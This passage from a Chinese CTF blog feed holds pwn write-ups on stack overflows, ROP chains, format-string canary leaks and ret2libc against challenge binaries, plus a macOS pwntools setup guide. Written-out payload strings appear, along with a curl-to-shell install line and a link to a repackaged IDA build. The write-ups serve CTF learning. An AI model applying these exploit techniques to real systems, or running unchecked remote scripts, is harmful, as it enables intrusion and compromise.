data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/2020%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%20April/%E6%88%AA%E5%B1%8F2020-04-27%20%E4%B8%8B%E5%8D%889.31.13.png" class="lazyload" title="exp"></a></p><p>与x86不同，x64的程序传参时，会先把参数按顺序放进rdi, rsi, rdx, rcx, r8, r9这6个寄存器里去，然后多出来的参数才会通过栈传递。我们在进行ROP时，要先传参，再调用函数。</p><p>line 16～line 19在构造第一个payload，目的是利用printf函数输出read函数的got地址。先把第一个参数“%s”pop进rdi，再把read_got pop进rsi，之后调用printf就可以得到read函数的地址了。</p><p>那么怎样去执行pop rdi和pop rsi呢？就是直接在程序中寻找现有的小片段。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/2020%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%20April/%E6%88%AA%E5%B1%8F2020-04-27%20%E4%B8%8B%E5%8D%889.34.36.png" data-fancybox="group" data-caption="ROPgadget" class="fancybox"><img alt="ROPgadget" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/2020%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%20April/%E6%88%AA%E5%B1%8F2020-04-27%20%E4%B8%8B%E5%8D%889.34.36.png" class="lazyload" title="ROPgadget"></a></p><p>利用ROPgadget就可以便捷的查询到想要的gadgets。可以看到，没有单独的pop rsi可以用，这也就是为什么payload里传递第二个参数时多pop了一个0，就是为了填充r15寄存器，无论写多少都可以。每个小片段最后都是ret，所以我们可以做到一个小片段结束接着另一个小片段继续执行。构造的ROP链就是payload。printf用到的参数也都是利用ROPgadget寻找到的，非常方便。</p><p>在line 23多接收了3个字节，这是观察得来的。一般程序运行时的实际地址是7f开头的，根据这个向后推移找到了正确的地址。这个7f大概是电脑运行时分配给应用程序的地址开头（最高位），所以我们在接收地址时应当只取前六位，然后在最高位补00。（我们从二进制文件里取出的地址最高位是00，如果不只取前六位的话计算会出现错误）</p><p>在line 32注释了一个地址，这个地址指向的是一个单独的ret指令。我们在打远程的时候需要多跳转一次ret。这是由于程序源代码中，定义的函数返回值类型是void导致的。如果不多跳转一次程序会崩溃，在远程的情况下，程序崩溃我们就得不到回显，所以打远程要多跳转一次，本地不用。</p><p><em>通过这道题真的学到了许多。其中的一些细节问题多谢<strong>不会修电脑</strong>师傅的耐心解答</em></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这次依然是只看pwn,只看了一题，其他两题是堆，干脆就没看。&lt;/p&gt;
&lt;h1 id=&quot;echo-sever&quot;&gt;&lt;a href=&quot;#echo-sever&quot; class=&quot;headerlink&quot; title=&quot;echo sever&quot;&gt;&lt;/a&gt;echo sever&lt;/h1&gt;&lt;p&gt;
      
    
    </summary>
    
    
    
      <category term="CTF" scheme="https://cdn.n0p3.cn/tags/CTF/"/>
    
      <category term="参加的比赛" scheme="https://cdn.n0p3.cn/tags/%E5%8F%82%E5%8A%A0%E7%9A%84%E6%AF%94%E8%B5%9B/"/>
    
      <category term="PWN" scheme="https://cdn.n0p3.cn/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>在MacOS 10.15 上配置基本的Pwn环境</title>
    <link href="https://cdn.n0p3.cn/2020/04/22/MacOSPwn/"/>
    <id>https://cdn.n0p3.cn/2020/04/22/MacOSPwn/</id>
    <published>2020-04-22T11:32:35.000Z</published>
    <updated>2020-07-29T14:35:34.217Z</updated>
    
    <content type="html"><![CDATA[<p><em>Mac Pwn实在是不够香，还是虚拟机好用！</em></p><p><em>Catalina给我造成了相当多的麻烦，于是便记录一下过程</em></p><h1 id="安装Pwntools"><a href="#安装Pwntools" class="headerlink" title="安装Pwntools"></a>安装Pwntools</h1><p>首先，<strong>不要使用pip！</strong></p><p>网上安装pwntools的教程中最多的就是pip安装，官网上的安装介绍也是pip安装。但是我们使用MacOS的homebrew来安装。</p><p>如果你没有安装homebrew，执行下面的自动脚本</p><p><code>/bin/zsh -c &quot;$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/Homebrew.sh)&quot;</code></p><p>直接在终端输入回车根据提示执行即可。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MacOSPwn/%E6%88%AA%E5%B1%8F2020-04-22%20%E4%B8%8B%E5%8D%884.15.59.png" data-fancybox="group" data-caption="homebrew" class="fancybox"><img alt="homebrew" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MacOSPwn/%E6%88%AA%E5%B1%8F2020-04-22%20%E4%B8%8B%E5%8D%884.15.59.png" class="lazyload" title="homebrew"></a></p><p>homebrew就安装好了。</p><p>执行<code>brew install pwntools</code> 安装pwntools</p><p>再执行<code>brew install https://raw.githubusercontent.com/Gallopsled/pwntools-binutils/master/osx/binutils-amd64.rb</code>  安装二进制工具binutils</p><p>安装binutils时你可能会遇到443报错，这是由于众所周知的原因导致raw.githubusercontent.com的DNS解析被污染了。</p><p>Step 1:  访问这个网站<a href="https://www.ipaddress.com/去查询raw.githubusercontent.com" target="_blank" rel="noopener">https://www.ipaddress.com/去查询raw.githubusercontent.com</a></p><p>的真实ip地址。</p><p>Step 2: 添加到/etc/hosts中</p><p>完成之后应该就可以下载了。</p><p>然后要把pwntools包加入到python环境里</p><p>在/Library/Python/2.7/site-packages中新建一个.pth文件然后写入</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;local&#x2F;Cellar&#x2F;pwntools&#x2F;4.0.1_1&#x2F;libexec&#x2F;lib&#x2F;python3.8&#x2F;site-packages</span><br></pre></td></tr></table></figure></div><p><em>这一行需要自己看情况写，pwntools版本和python版本可能会不同</em></p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MacOSPwn/%E6%88%AA%E5%B1%8F2020-04-22%20%E4%B8%8B%E5%8D%888.45.40.png" data-fancybox="group" data-caption="path" class="fancybox"><img alt="path" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MacOSPwn/%E6%88%AA%E5%B1%8F2020-04-22%20%E4%B8%8B%E5%8D%888.45.40.png" class="lazyload" title="path"></a>然后就可以测试基本功能了。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MacOSPwn/%E6%88%AA%E5%B1%8F2020-04-22%20%E4%B8%8B%E5%8D%884.54.32.png" data-fancybox="group" data-caption="checksec" class="fancybox"><img alt="checksec" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MacOSPwn/%E6%88%AA%E5%B1%8F2020-04-22%20%E4%B8%8B%E5%8D%884.54.32.png" class="lazyload" title="checksec"></a></p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MacOSPwn/%E6%88%AA%E5%B1%8F2020-04-22%20%E4%B8%8B%E5%8D%888.53.28.png" data-fancybox="group" data-caption="pwntools" class="fancybox"><img alt="pwntools" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MacOSPwn/%E6%88%AA%E5%B1%8F2020-04-22%20%E4%B8%8B%E5%8D%888.53.28.png" class="lazyload" title="pwntools"></a></p><p>测试都OK</p><h1 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h1><p>ida在Major版本上很好安装，但是网上现有的所有的安装包都无法在Catalina上安装。解决办法大致是 安装Major虚拟机，再安装旧版ida，打补丁拷贝目录到Catalina。实际操作起来有很多问题且很麻烦，于是我直接打包好了Catalina可用的dmg。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/source/Ida%20for%20MacOS10.15.dmg" target="_blank" rel="noopener">Ida for Catalina</a></p><p>密码 <strong><em>n0p3.top</em></strong>，记得不要更新。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;Mac Pwn实在是不够香，还是虚拟机好用！&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Catalina给我造成了相当多的麻烦，于是便记录一下过程&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;安装Pwntools&quot;&gt;&lt;a href=&quot;#安装Pwntools&quot; class=&quot;header
      
    
    </summary>
    
    
    
      <category term="CTF" scheme="https://cdn.n0p3.cn/tags/CTF/"/>
    
      <category term="PWN" scheme="https://cdn.n0p3.cn/tags/PWN/"/>
    
      <category term="MacOS" scheme="https://cdn.n0p3.cn/tags/MacOS/"/>
    
  </entry>
  
  <entry>
    <title>hfctf-2020</title>
    <link href="https://cdn.n0p3.cn/2020/04/20/hfctf-2020/"/>
    <id>https://cdn.n0p3.cn/2020/04/20/hfctf-2020/</id>
    <published>2020-04-20T03:48:59.000Z</published>
    <updated>2020-05-19T04:48:19.521Z</updated>
    
    <content type="html"><![CDATA[<p>参加了2020的虎符ctf，因为最近在学pwn，其他题目也就没有看，最后只解出一道pwn题。真的是太菜了，等着学习大师傅们的wp吧。</p><h1 id="count"><a href="#count" class="headerlink" title="count"></a>count</h1><p><em>只有这道题是在出wp之前做出的。</em></p><p>连接题目返回一个算式，要求通过200关。看起来不像pwn题，猜测可能是输入的地方存在漏洞。</p><p>拖进ida，发现好像汇编有点奇怪，不是平时常见架构的程序。</p><p>发现sub_400990是main函数</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/hfctf/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8A%E5%8D%8811.44.08.png" data-fancybox="group" data-caption="main" class="fancybox"><img alt="main" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/hfctf/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8A%E5%8D%8811.44.08.png" class="lazyload" title="main"></a></p><p>阅读代码，随机生成4个在0～99的整数，要求用户输入line 38的计算结果，连续输入正确200次后就会调用一个read函数，共度入100个字节，然而v8只有78个字节，所以这里存在栈溢出漏洞。紧接着下面有一个if，判断v9是否等于304305682，如果等于讲调用函数sub_400920,看一下这个函数</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/hfctf/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8A%E5%8D%8811.43.33.png" data-fancybox="group" data-caption="400920" class="fancybox"><img alt="400920" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/hfctf/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8A%E5%8D%8811.43.33.png" class="lazyload" title="400920"></a></p><p>直接就get shell。</p><p>所以我们的攻击思路就是，先完成200关的计算任务，最后利用栈溢出覆盖v9的值，使if成立即可。</p><p>exp如下</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/hfctf/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8A%E5%8D%8811.41.55.png" data-fancybox="group" data-caption="exp" class="fancybox"><img alt="exp" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/hfctf/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8A%E5%8D%8811.41.55.png" class="lazyload" title="exp"></a></p><p>因为不会正则，只能手动分离4个数字了orz</p><p>执行</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/hfctf/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8A%E5%8D%8811.32.41.png" data-fancybox="group" data-caption="flag" class="fancybox"><img alt="flag" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/hfctf/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8A%E5%8D%8811.32.41.png" class="lazyload" title="flag"></a></p><p>[以下为赛后Pwn题复现]</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;参加了2020的虎符ctf，因为最近在学pwn，其他题目也就没有看，最后只解出一道pwn题。真的是太菜了，等着学习大师傅们的wp吧。&lt;/p&gt;
&lt;h1 id=&quot;count&quot;&gt;&lt;a href=&quot;#count&quot; class=&quot;headerlink&quot; title=&quot;count&quot;&gt;&lt;
      
    
    </summary>
    
    
    
      <category term="CTF" scheme="https://cdn.n0p3.cn/tags/CTF/"/>
    
      <category term="参加的比赛" scheme="https://cdn.n0p3.cn/tags/%E5%8F%82%E5%8A%A0%E7%9A%84%E6%AF%94%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>XCTF-Pwn-Advance</title>
    <link href="https://cdn.n0p3.cn/2020/04/18/XCTF-Pwn-Advance/"/>
    <id>https://cdn.n0p3.cn/2020/04/18/XCTF-Pwn-Advance/</id>
    <published>2020-04-18T14:03:23.000Z</published>
    <updated>2020-07-16T08:24:53.155Z</updated>
    
    <content type="html"><![CDATA[<h1 id="fogot"><a href="#fogot" class="headerlink" title="fogot"></a>fogot</h1><p>nc连接题目</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/fogot/%E6%88%AA%E5%B1%8F2020-04-18%20%E4%B8%8B%E5%8D%8810.04.30.png" data-fancybox="group" data-caption="nc" class="fancybox"><img alt="nc" title="nc" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/fogot/%E6%88%AA%E5%B1%8F2020-04-18%20%E4%B8%8B%E5%8D%8810.04.30.png" class="lazyload"></a></p><p>阅读文本，这个程序大概是一个检查邮箱格式是否合法的程序。</p><p>拖进ida分析</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/fogot/%E6%88%AA%E5%B1%8F2020-04-18%20%E4%B8%8B%E5%8D%887.54.22.png" data-fancybox="group" data-caption="main" class="fancybox"><img alt="main" title="main" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/fogot/%E6%88%AA%E5%B1%8F2020-04-18%20%E4%B8%8B%E5%8D%887.54.22.png" class="lazyload"></a></p><p>分两部分来看main函数，前半部分有数个函数指针，指向的是很多个只输出一条文本的函数。，接着用户的两次输入，可以看到有两处溢出，溢出点分别在33行和41行。继续看下半部分。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/fogot/%E6%88%AA%E5%B1%8F2020-04-18%20%E4%B8%8B%E5%8D%887.55.24.png" data-fancybox="group" data-caption="main2" class="fancybox"><img alt="main2" title="main2" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/fogot/%E6%88%AA%E5%B1%8F2020-04-18%20%E4%B8%8B%E5%8D%887.55.24.png" class="lazyload"></a></p><p>有一段代码，解读一下就是在对我们第二次输入的邮箱地址进行逐个字符的分析，当找到‘@’时，就继续寻找‘.’，中间如果有没能找到的关键字符就执行不同的提示函数，前一段的数个函数指针指向的就是不同的提示函数。每完成一个要求v14就加1，最后调用不同的函数。</p><p>看一下栈</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/fogot/%E6%88%AA%E5%B1%8F2020-04-18%20%E4%B8%8B%E5%8D%887.58.28.png" data-fancybox="group" data-caption="栈" class="fancybox"><img alt="栈" title="栈" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/fogot/%E6%88%AA%E5%B1%8F2020-04-18%20%E4%B8%8B%E5%8D%887.58.28.png" class="lazyload"></a></p><p>我们输入的邮箱地址程序里又正好给了可以getflag的函数，所以我们的攻击思路就是，利用溢出漏洞覆盖某个函数指针指向的函数为目标函数，然后满足代码条件使它执行。</p><p>我选了v12函数指针，exp如下</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/fogot/%E6%88%AA%E5%B1%8F2020-04-18%20%E4%B8%8B%E5%8D%888.08.53.png" data-fancybox="group" data-caption="exp" class="fancybox"><img alt="exp" title="exp" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/fogot/%E6%88%AA%E5%B1%8F2020-04-18%20%E4%B8%8B%E5%8D%888.08.53.png" class="lazyload"></a></p><p>‘a@a.comm’最后会调用v12，后面的部分覆盖v12指向的函数。</p><h1 id="Mary-Morton"><a href="#Mary-Morton" class="headerlink" title="Mary_Morton"></a>Mary_Morton</h1><p>连接题目看一下</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/Mary_Morton/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8B%E5%8D%884.30.18.png" data-fancybox="group" data-caption="nc" class="fancybox"><img alt="nc" title="nc" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/Mary_Morton/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8B%E5%8D%884.30.18.png" class="lazyload"></a></p><p>可以选择攻击方式，栈溢出或者格式化字符串，但是这道题真的是想考察这两个知识而已吗？</p><p>拖进ida分析</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/Mary_Morton/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8B%E5%8D%884.26.08.png" data-fancybox="group" data-caption="main" class="fancybox"><img alt="main" title="main" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/Mary_Morton/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8B%E5%8D%884.26.08.png" class="lazyload"></a></p><p>可以看出程序有canary保护</p><p>main函数就是让用户选择，然后调用不同的函数的，主要看sub_4008EB和sub_400960</p><p>sub_4008EB</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/Mary_Morton/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8B%E5%8D%884.31.00.png" data-fancybox="group" data-caption="4008eb" class="fancybox"><img alt="4008eb" title="4008eb" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/Mary_Morton/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8B%E5%8D%884.31.00.png" class="lazyload"></a></p><p>如题目所说，确实存在一个格式化字符串漏洞，再去看sub_400960</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/Mary_Morton/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8B%E5%8D%884.31.12.png" data-fancybox="group" data-caption="400960" class="fancybox"><img alt="400960" title="400960" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/Mary_Morton/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8B%E5%8D%884.31.12.png" class="lazyload"></a></p><p>同样也真的存在一个栈溢出漏洞，那我们的攻击思路就有了：</p><p>先利用格式化字符串漏洞得到canary的值，再利用栈溢出漏洞构造rop链调用flag函数。canary的位置，首先计算步长，也就是printf取参数指针到buf的距离，测试得出是6，再加上buf到v2的距离0x90-0x8=0x88(十进制17)，所以17+6=23</p><p>exp如下</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/Mary_Morton/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8B%E5%8D%884.30.04.png" data-fancybox="group" data-caption="exp" class="fancybox"><img alt="exp" title="exp" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/Mary_Morton/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8B%E5%8D%884.30.04.png" class="lazyload"></a></p><p>花了我最长时间的地方居然是处理接收到的canary值，很多写法都莫名报错，最后这样写是可以的。</p><h1 id="pwn-200"><a href="#pwn-200" class="headerlink" title="pwn-200"></a>pwn-200</h1><p><em>\</em>这题用到pwntools的一个功能DynELF*</p><p>nc连接只有一次输出一次输入，拖进ida分析</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-200/%E6%88%AA%E5%B1%8F2020-04-23%20%E4%B8%8B%E5%8D%888.08.30.png" data-fancybox="group" data-caption="main" class="fancybox"><img alt="main" title="main" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-200/%E6%88%AA%E5%B1%8F2020-04-23%20%E4%B8%8B%E5%8D%888.08.30.png" class="lazyload"></a></p><p>定义了很多变量，但是也没用到，调用了sub_8048484</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-200/%E6%88%AA%E5%B1%8F2020-04-23%20%E4%B8%8B%E5%8D%888.08.50.png" data-fancybox="group" data-caption="8048484" class="fancybox"><img alt="8048484" title="8048484" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-200/%E6%88%AA%E5%B1%8F2020-04-23%20%E4%B8%8B%E5%8D%888.08.50.png" class="lazyload"></a></p><p>很明显在line 6存在栈溢出漏洞，但是没有system函数，也没有shellcode，所以要用到DynELF。<em>（libcSearch也是查找libc用的，但是我并没有用过）</em></p><p>exp如下</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-200/%E6%88%AA%E5%B1%8F2020-04-23%20%E4%B8%8B%E5%8D%888.17.47.png" data-fancybox="group" data-caption="exp" class="fancybox"><img alt="exp" title="exp" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-200/%E6%88%AA%E5%B1%8F2020-04-23%20%E4%B8%8B%E5%8D%888.17.47.png" class="lazyload"></a></p><p>在使用DynELF的功能前需要先设定一个dyn对象，在line 12，第一个参数指定leak地址用的函数，第二个参数是目标程序。</p><p><em>DynELF的lookup函数就是利用我们写的leak函数来循环爆破寻找system的地址，leak函数有一定的格式。</em></p><p>shellcode可以通过一段可用的bss段储存</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-200/%E6%88%AA%E5%B1%8F2020-04-23%20%E4%B8%8B%E5%8D%889.34.53.png" data-fancybox="group" data-caption="bss" class="fancybox"><img alt="bss" title="bss" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-200/%E6%88%AA%E5%B1%8F2020-04-23%20%E4%B8%8B%E5%8D%889.34.53.png" class="lazyload"></a></p><p>exp逻辑不复杂，但是要注意堆栈的恢复和一些细节。</p><h1 id="Pwn-100"><a href="#Pwn-100" class="headerlink" title="Pwn-100"></a>Pwn-100</h1><p><em>\</em>这道题花了很长时间，主要花时间在想用DynELF做，到最后也没有写出来，还是用LibcSearcher解了。*</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-100/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%886.18.58.png" data-fancybox="group" data-caption="nc" class="fancybox"><img alt="nc" title="nc" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-100/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%886.18.58.png" class="lazyload"></a></p><p>链接看一下，直接有输入，一直输一直输，要很长才会输出一个bye～，ida看一下</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-100/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%886.19.26.png" data-fancybox="group" data-caption="ida" class="fancybox"><img alt="ida" title="ida" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-100/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%886.19.26.png" class="lazyload"></a></p><p>主函数没东西，跟踪到40068E看一下</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-100/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%886.19.39.png" data-fancybox="group" data-caption="68e" class="fancybox"><img alt="68e" title="68e" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-100/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%886.19.39.png" class="lazyload"></a></p><p>声明了一个v1，调用40063D，注意传参传了一个200，继续看</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-100/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%886.19.49.png" data-fancybox="group" data-caption="63d" class="fancybox"><img alt="63d" title="63d" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-100/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%886.19.49.png" class="lazyload"></a></p><p>一个执行200次的循环，循环体是一个只读入1个字节的read，显然这里存在溢出。</p><p>exp：</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-100/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%886.33.55.png" data-fancybox="group" data-caption="exp" class="fancybox"><img alt="exp" title="exp" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-100/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%886.33.55.png" class="lazyload"></a></p><p>第16行为什么这样写，需要自己去调试出来。</p><p><em>LibcSearcher和Ropgadget真好用。</em></p><h1 id="反应釜开关控制"><a href="#反应釜开关控制" class="headerlink" title="反应釜开关控制"></a>反应釜开关控制</h1><p>有故事背景，还有多层的代码，感觉是个好玩的题，结果一看发现就是简单的栈溢出</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/%E5%8F%8D%E5%BA%94%E9%87%9C%E6%8E%A7%E5%88%B6%E5%BC%80%E5%85%B3/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%888.36.03.png" data-fancybox="group" data-caption="exp" class="fancybox"><img alt="exp" title="exp" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/%E5%8F%8D%E5%BA%94%E9%87%9C%E6%8E%A7%E5%88%B6%E5%BC%80%E5%85%B3/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%888.36.03.png" class="lazyload"></a></p><p>非常简单，看了官方wp发现这原来是一道盲打。emmm，果然是道好题。</p><h1 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h1><p><em>\</em>因为期末导致一段时间没有做pwn了，拿这道题找找感觉*</p><p>题目描述没有过多信息，看题。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn1/%E6%89%B9%E6%B3%A8%202020-07-07%20175926.png" data-fancybox="group" data-caption="sec" class="fancybox"><img alt="sec" title="sec" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn1/%E6%89%B9%E6%B3%A8%202020-07-07%20175926.png" class="lazyload"></a></p><p>64位。</p><p>三个选项，1.储存，2.打印，3.退出</p><p>看main函数</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn1/%E6%89%B9%E6%B3%A8%202020-07-07%20175517.png" data-fancybox="group" data-caption="main" class="fancybox"><img alt="main" title="main" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn1/%E6%89%B9%E6%B3%A8%202020-07-07%20175517.png" class="lazyload"></a></p><p>s的大小是0x80个字节，read却可以读取0x100个字节，存在很明显的溢出。但是有canary保护所以我们首先要泄漏canary。之前利用过格式化字符串泄漏canary，这次要利用puts函数的特性来泄漏。</p><p>puts函数只有遇到空字节才会停止输出，即使是0a（换行）也不会停止。canary的第一个字节是空字节，所以puts不会把canary输出，我们只要溢出覆盖掉canary的第一个字节就可以把canary泄漏出来了。</p><p>s距离canary 0x88个字节，要覆盖掉canary的首位就构造一个0x89个字符的payload。</p><p><code>payload=0x85*&#39;a&#39;+&#39;N0P3&#39;</code></p><p>获得canary之后就可以进一步泄漏库函数地址计算offset了。</p><p><code>payload=0x84*&#39;a&#39;+&#39;N0P3&#39;+p64(canary)+&#39;b&#39;*0x8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(start_addr)</code></p><p>小片段是通过ROPgadget找到的。</p><p>获得offset之后就可以按照一般的ret2libc方法get shell了。但是这里对payload的长度有限制（0x100），所以用one_gadget来解。</p><p>最后的payload</p><p><code>payload=0x84*&#39;a&#39;+&#39;N0P3&#39;+p64(canary)+&#39;b&#39;*0x8+p64(GetShell)</code></p><p>Exp</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 